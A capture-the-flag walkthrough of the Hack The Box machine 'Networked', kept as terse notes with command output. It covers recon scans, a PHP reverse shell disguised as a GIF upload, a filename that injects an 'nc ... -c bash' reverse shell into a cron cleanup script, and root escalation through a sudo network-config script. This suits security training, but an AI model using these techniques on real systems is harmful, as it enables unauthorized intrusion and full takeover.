@@ -1,0 +1,487 @@
+RECON
+root@kali:~/htb/networked# nmap -sC -sV -p- -vv -oA  full 10.10.10.146
+PORT    STATE  SERVICE REASON         VERSION
+22/tcp  open   ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFgr+LYQ5zL9JWnZmjxP7FT1134sJla89HBT+qnqNvJQRHwO7IqPSa5tEWGZYtzQ2BehsEqb/PisrRHlTeatK0X8qrS3tuz+l1nOj3X/wdcgnFXBrhwpRB2spULt2YqRM49aEbm7bRf2pctxuvgeym/pwCghb6nSbdsaCIsoE+X7QwbG0j6ZfoNIJzQkTQY7O+n1tPP8mlwPOShZJP7+NWVf/kiHsgZqVx6xroCp/NYbQTvLWt6VF/V+iZ3tiT7E1JJxJqQ05wiqsnjnFaZPYP+ptTqorUKP4AenZnf9Wan7VrrzVNZGnFlczj/BsxXOYaRe4Q8VK4PwiDbcwliOBd
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAsf1XXvL55L6U7NrCo3XSBTr+zCnnQ+GorAMgUugr3ihPkA+4Tw2LmpBr1syz7Z6PkNyQw6NzC3KwSUy1BOGw8=
+|   256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMrhnJBfdb0fWQsWVfynAxcQ8+SNlL38vl8VJaaqPTL
+80/tcp  open   http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+443/tcp closed https   reset ttl 63
+
+
+WEB ENUM
+root@kali:~/htb/networked# nikto -h 10.10.10.146
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.146
++ Target Hostname:    10.10.10.146
++ Target Port:        80
++ Start Time:         2020-12-06 16:22:11 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
++ Retrieved x-powered-by header: PHP/5.4.16
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ PHP/5.4.16 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
++ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3268: /backup/: Directory indexing found.
++ OSVDB-3092: /backup/: This might be interesting...
++ OSVDB-3268: /icons/: Directory indexing found.
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8313 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2020-12-06 16:34:57 (GMT-5) (766 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+root@kali:~/htb/networked# uniscan -u http://10.10.10.146 -qweds
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+
+Scan date: 6-12-2020 16:42:48
+===================================================================================================
+| Domain: http://10.10.10.146/
+| Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+| IP: 10.10.10.146
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://10.10.10.146/backup/
+| [+] CODE: 200 URL: http://10.10.10.146/icons/
+| [+] CODE: 200 URL: http://10.10.10.146/uploads/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://10.10.10.146/index.php
+===================================================================================================
+
+| FCKeditor File Upload:
+|
+| E-mails:
+| [+] E-mail Found: mike@hyperreal.org
+| [+] E-mail Found: humbedooh@apache.org
+| [+] E-mail Found: kevinh@kevcom.com
+|
+| Web Backdoors:
+|
+| PHPinfo() Disclosure:
+|
+| Ignored Files: 
+| http://10.10.10.146/backup/backup.tar
+
+root@kali:~/htb/networked# python3 /root/dirsearch/dirsearch.py -w /usr/share/wordlists/dirb/common.txt -r -R 3 -e "php,js,txt,html,css,png,config,pl" -f -t 50 -u http://10.10.10.146 
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, js, txt, html, css, png, config, pl | HTTP method: GET | Threads: 50 | Wordlist size: 46110
+
+Error Log: /root/dirsearch/logs/errors-20-12-06_16-47-01.log
+
+Target: http://10.10.10.146/
+
+Output File: /root/dirsearch/reports/10.10.10.146/_20-12-06_16-47-02.txt
+
+[16:47:02] Starting: 
+[16:47:31] 200 -  885B  - //backup/     (Added to queue)
+[16:47:31] 301 -  235B  - //backup  ->  http://10.10.10.146/backup/
+[16:47:39] 403 -  210B  - //cgi-bin/     (Added to queue)
+[16:48:23] 200 -   73KB - //icons/     (Added to queue)
+[16:48:24] 200 -  229B  - //index.php
+[16:48:24] 200 -  229B  - //index.php/     (Added to queue)
+[16:48:30] 200 -    0B  - //lib.php
+[16:48:50] 200 -    1KB - //photos.php
+[16:49:34] 200 -  169B  - //upload.php
+[16:49:34] 200 -    2B  - //uploads/     (Added to queue)
+[16:49:34] 301 -  236B  - //uploads  ->  http://10.10.10.146/uploads/
+[16:58:25] Starting: icons/
+[16:58:42] 200 -  246B  - //icons/a
+[16:58:42] 200 -  306B  - //icons/a.png
+[16:58:48] 200 -  308B  - //icons/back.png
+[16:58:48] 200 -  216B  - //icons/back
+[16:58:50] 200 -  246B  - //icons/binary
+[16:58:50] 200 -  310B  - //icons/binary.png
+[16:58:51] 200 -  148B  - //icons/blank
+[16:58:51] 200 -  215B  - //icons/blank.png
+[16:58:52] 200 -  247B  - //icons/broken
+[16:58:52] 200 -  320B  - //icons/broken.png
+[16:58:53] 200 -  299B  - //icons/c.png
+[16:58:53] 200 -  242B  - //icons/c
+[16:59:01] 200 -    1KB - //icons/compressed.png
+[16:59:01] 200 -    1KB - //icons/compressed
+[16:59:10] 200 -  295B  - //icons/dir.png
+[16:59:10] 200 -  225B  - //icons/dir
+[16:59:12] 200 -  256B  - //icons/down.png
+[16:59:12] 200 -  163B  - //icons/down
+[16:59:21] 200 -  296B  - //icons/f.png
+[16:59:21] 200 -  236B  - //icons/f
+[16:59:28] 200 -  295B  - //icons/folder.png
+[16:59:28] 200 -  225B  - //icons/folder
+[16:59:29] 200 -  308B  - //icons/forward.png
+[16:59:29] 200 -  219B  - //icons/forward
+[16:59:31] 200 -  275B  - //icons/generic.png
+[16:59:31] 200 -  221B  - //icons/generic
+[16:59:36] 200 -  332B  - //icons/index.png
+[16:59:36] 200 -  268B  - //icons/index
+[16:59:45] 200 -  323B  - //icons/layout.png
+[16:59:45] 200 -  276B  - //icons/layout
+[16:59:46] 200 -  172B  - //icons/left
+[16:59:46] 200 -  257B  - //icons/left.png
+[16:59:47] 200 -  314B  - //icons/link.png
+[16:59:47] 200 -  249B  - //icons/link
+[17:00:03] 200 -  272B  - //icons/movie.png
+[17:00:03] 200 -  243B  - //icons/movie
+[17:00:14] 200 -  298B  - //icons/p.png
+[17:00:14] 200 -  237B  - //icons/p
+[17:00:15] 200 -  251B  - //icons/patch
+[17:00:15] 200 -  310B  - //icons/patch.png
+[17:00:15] 200 -  304B  - //icons/pdf.png
+[17:00:15] 200 -  249B  - //icons/pdf
+[17:00:16] 200 -    2KB - //icons/php
+[17:00:22] 200 -  319B  - //icons/portal.png
+[17:00:22] 200 -  254B  - //icons/portal
+[17:00:25] 200 -  303B  - //icons/ps.png
+[17:00:25] 200 -  244B  - //icons/ps
+[17:00:27] 200 -    5KB - //icons/README
+[17:00:27] 200 -   35KB - //icons/README.html
+[17:00:38] 200 -  254B  - //icons/right.png
+[17:00:38] 200 -  172B  - //icons/right
+[17:00:43] 200 -  290B  - //icons/script.png
+[17:00:45] 200 -  242B  - //icons/script
+[17:00:58] 301 -  240B  - //icons/small  ->  http://10.10.10.146/icons/small/     (Added to queue)
+[17:00:58] 200 -   14KB - //icons/small/
+[17:01:04] 200 -  261B  - //icons/tar.png
+[17:01:04] 200 -  219B  - //icons/tar
+[17:01:05] 200 -  229B  - //icons/text
+[17:01:05] 200 -  288B  - //icons/text.png
+[17:01:08] 200 -  242B  - //icons/transfer
+[17:01:08] 200 -  334B  - //icons/transfer.png
+[17:01:10] 200 -  255B  - //icons/up.png
+[17:01:10] 200 -  164B  - //icons/up
+[17:01:25] 200 -    1KB - //icons/xml
+[17:01:25] 200 -    1KB - //icons/xml.png
+[17:01:26] Starting: index.php/
+[17:04:52] Starting: uploads/
+[17:06:48] 200 -    2B  - //uploads/index.html
+[17:08:00] Starting: backup/.hta/
+[17:10:26] Starting: cgi-bin/.hta/
+[17:12:42] Starting: icons/.hta/
+[17:15:07] Starting: icons/small/
+[17:15:26] 200 -  181B  - //icons/small/back.png
+[17:15:27] 200 -  129B  - //icons/small/back
+[17:15:28] 200 -  134B  - //icons/small/binary
+[17:15:28] 200 -  172B  - //icons/small/binary.png
+[17:15:28] 200 -  100B  - //icons/small/blank.png
+[17:15:28] 200 -   55B  - //icons/small/blank
+[17:15:30] 200 -  184B  - //icons/small/broken.png
+[17:15:30] 200 -  139B  - //icons/small/broken
+[17:15:37] 200 -  212B  - //icons/small/compressed.png
+[17:15:37] 200 -  128B  - //icons/small/compressed
+[17:15:46] 200 -  222B  - //icons/small/doc.png
+[17:15:46] 200 -  191B  - //icons/small/doc
+[17:15:57] 200 -  196B  - //icons/small/folder.png
+[17:15:57] 200 -  132B  - //icons/small/folder
+[17:15:58] 200 -  125B  - //icons/small/forward
+[17:15:58] 200 -  174B  - //icons/small/forward.png
+[17:15:59] 200 -  149B  - //icons/small/generic.png
+[17:16:00] 200 -  116B  - //icons/small/generic
+[17:16:05] 200 -  126B  - //icons/small/image
+[17:16:05] 200 -  197B  - //icons/small/image.png
+[17:16:05] 200 -  145B  - //icons/small/index
+[17:16:05] 200 -  225B  - //icons/small/index.png
+[17:16:10] 200 -  210B  - //icons/small/key.png
+[17:16:10] 200 -  187B  - //icons/small/key
+[17:16:21] 200 -  134B  - //icons/small/movie
+[17:16:21] 200 -  159B  - //icons/small/movie.png
+[17:16:31] 200 -  211B  - //icons/small/patch.png
+[17:16:31] 200 -  182B  - //icons/small/patch
+[17:16:39] 200 -  217B  - //icons/small/ps.png
+[17:16:39] 200 -  184B  - //icons/small/ps
+[17:16:54] 200 -  197B  - //icons/small/sound.png
+[17:16:54] 200 -  130B  - //icons/small/sound
+[17:16:59] 200 -  173B  - //icons/small/tar.png
+[17:16:59] 200 -  132B  - //icons/small/tar
+[17:17:00] 200 -  128B  - //icons/small/text
+[17:17:00] 200 -  163B  - //icons/small/text.png
+[17:17:02] 200 -  211B  - //icons/small/transfer.png
+[17:17:02] 200 -  124B  - //icons/small/transfer
+[17:17:16] Starting: uploads/.hta/
+[17:19:38] Starting: icons/small/.hta/
+
+Task Completed
+
+
+
+CHECK WEBPAGE SOURCE
+
+<html>
+<body>
+Hello mate, we're building the new FaceMash!</br>
+Help by funding us and be the new Tyler&Cameron!</br>
+Join us at the pool party this Sat to get a glimpse
+<!-- upload and gallery not yet linked -->
+</body>
+</html>
+
+
+REVIEW BACK WEB DIRECTORY
+http://10.10.10.146/backup/
+
+UNTAR THE BACK UP FILE
+root@kali:~/htb/networked# wget http://networked.htb/backup/backup.tar
+
+
+root@kali:~/htb/networked# tar tvf backup.tar
+-rw-r--r-- root/root       229 2019-07-09 17:20 index.php
+-rw-r--r-- root/root      2001 2019-07-02 17:20 lib.php
+-rw-r--r-- root/root      1871 2019-07-02 17:20 photos.php
+-rw-r--r-- root/root      1331 2019-07-02 17:20 upload.php
+
+REVIEW UPLOAD PHP FILE
+root@kali:~/htb/networked# cat upload.php 
+
+VALID IMAGE EXTENSIONS FOR UPLOAD
+//$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
+    list ($foo,$ext) = getnameUpload($myFile["name"]);
+    $validext = array('.jpg', '.png', '.gif', '.jpeg');
+
+UPLOAD DIRECTORY PATH
+root@kali:~/htb/networked# cat photos.php 
+require '/var/www/html/lib.php';
+$path = '/var/www/html/uploads/';
+
+
+NEED TO ADJUST FILE MIME TYPE FOR UPLOADING
+root@kali:~/htb/networked# cat lib.php
+function check_file_type($file) {
+  $mime_type = file_mime_type($file);
+  echo $mime_type;
+  if (strpos($mime_type, 'image/') === 0) {
+      return true;
+  } else {
+      return false;
+  }
+}
+
+CRITERIA FOR REVERSE SHELL FILE CREATION
+    to have a mime type image.
+    to ends with an image extension (png for example).
+    to match the regular expression /^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/.
+
+CREATE THE REVERSE SHELL
+https://vk9-sec.com/local-file-upload-magic-byte-change-file-type/
+
+USE PENTEST MONKEY REVERSE PHP SHELL
+root@kali:~/htb/networked# cp /usr/share/webshells/php/php-reverse-shell.php .
+root@kali:~/htb/networked# cp php-reverse-shell.php shell.php
+root@kali:~/htb/networked# vim shell.php
+ADD LOCAL IP AND PORT FOR LISTENER
+$ip = '10.10.14.8';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+
+ADD GIF MAGIC BYTE TO TOP OF PHP REVERSE SHELL FILE
+root@kali:~/htb/networked# vim shell.php.gif 
+root@kali:~/htb/networked# cat shell.php.gif | grep GIF8
+GIF8;<?php
+root@kali:~/htb/networked# file shell.php.gif 
+shell.php.gif: GIF image data 28735 x 28776
+
+UPLOAD TO NETWORKED
+http://10.10.10.146/upload.php
+file uploaded, refresh gallery
+
+START LISTENER
+root@kali:~/htb/networked# nc -lvp 1234
+
+TRIGGER REVERSE SHELL IN PHOTOS WEB DIRECTORY
+http://10.10.10.146/photos.php
+
+GET LOW PRIV REVERSE SHELL
+root@kali:~/htb/networked# nc -lvp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.8] from networked.htb [10.10.10.146] 40244
+Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 03:38:26 up  5:25,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ id & hostname & uname -ar & ifconfig
+id & hostname & uname -ar & ifconfig
+[1] 16625
+[2] 16626
+[3] 16627
+uid=48(apache) gid=48(apache) groups=48(apache)
+Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+sh-4.2$ networked.htb
+
+PRIVESC
+sh-4.2$ ls -l /home/guly
+ls -l /home/guly
+total 12
+-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
+-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
+-r--------. 1 guly guly  33 Oct 30  2018 user.txt
+
+REVIEW CRONTAB AND CHECK_ATTACK SCRIPT
+sh-4.2$ cd /home/guly
+cd /home/guly
+sh-4.2$ cat crontab.guly
+cat crontab.guly
+*/3 * * * * php /home/guly/check_attack.php
+sh-4.2$ cat check_attack.php
+cat check_attack.php
+<?php
+require '/var/www/html/lib.php';
+$path = '/var/www/html/uploads/';
+$logpath = '/tmp/attack.log';
+$to = 'guly';
+$msg= '';
+$headers = "X-Mailer: check_attack.php\r\n";
+
+$files = array();
+$files = preg_grep('/^([^.])/', scandir($path));
+
+foreach ($files as $key => $value) {
+	$msg='';
+  if ($value == 'index.html') {
+	continue;
+  }
+  #echo "-------------\n";
+
+  #print "check: $value\n";
+  list ($name,$ext) = getnameCheck($value);
+  $check = check_ip($name,$value);
+
+  if (!($check[0])) {
+    echo "attack!\n";
+    # todo: attach file
+    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
+
+    exec("rm -f $logpath");
+    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+    echo "rm -f $path$value\n";
+    mail($to, $msg, $msg, $headers, "-F$value");
+  }
+}
+
+?>
+
+
+REVIEW NOHUP
+nohup - run a command immune to hangups, with output to a non-tty
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+
+PATH NOHUP CHECKS
+$path = '/var/www/html/uploads/';
+
+CREATE FILE IN UPLOADS WITH REVERSE SHELL (semicolon at the start to make nohup stop after 'rm' and then exec 'nc')
+sh-4.2$ cd /var/www/html/uploads
+cd /var/www/html/uploads
+sh-4.2$ touch ';nc 10.10.14.8 4321 -c bash'
+touch ';nc 10.10.14.8 4321 -c bash'
+sh-4.2$ ls -l
+ls -l
+total 28
+-rw-r--r--  1 apache apache 5497 Dec  7 03:35 10_10_14_8.php.gif
+-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_1.png
+-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_2.png
+-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_3.png
+-rw-r--r--. 1 root   root   3915 Oct 30  2018 127_0_0_4.png
+-rw-rw-rw-  1 apache apache    0 Dec  7 03:51 ;nc 10.10.14.8 4321 -c bash
+-r--r--r--. 1 root   root      2 Oct 30  2018 index.html
+
+
+START REVERSE SHELL LISTENER
+root@kali:~/htb/networked# nc -lvp 4321
+
+GET USER SHELL AS GULY
+root@kali:~/htb/networked# nc -lvp 4321
+listening on [any] 4321 ...
+connect to [10.10.14.8] from networked.htb [10.10.10.146] 42050
+id
+uid=1000(guly) gid=1000(guly) groups=1000(guly)
+pwd
+/home/guly
+
+GET USER FLAG
+cat user.txt
+##################################
+
+PRIVESC GULY
+sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+
+REVIEW CHANGENAME SCRIPT
+cat /usr/local/sbin/changename.sh
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+	echo "interface $var:"
+	read x
+	while [[ ! $x =~ $regexp ]]; do
+		echo "wrong input, try again"
+		echo "interface $var:"
+		read x
+	done
+	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+
+/sbin/ifup guly0
+
+SCRIPT ALLOWS ESCALATION TO ROOT
+https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f
+
+UPGRADE THE REVERSE SHELL
+python -c 'import pty; pty.spawn("/bin/bash")'
+[guly@networked ~]$ stty raw -echo
+stty raw -echo
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+
+RUN THE CHANGENAME SCRIPT
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+hackor /bin/bash
+interface PROXY_METHOD:
+get
+interface BROWSER_ONLY:
+root
+interface BOOTPROTO:
+now
+[root@networked network-scripts]# id
+uid=0(root) gid=0(root) groups=0(root)
+
+GET ROOT FLAG
+[root@networked network-scripts]# cat /root/root.txt
+########################
+
+
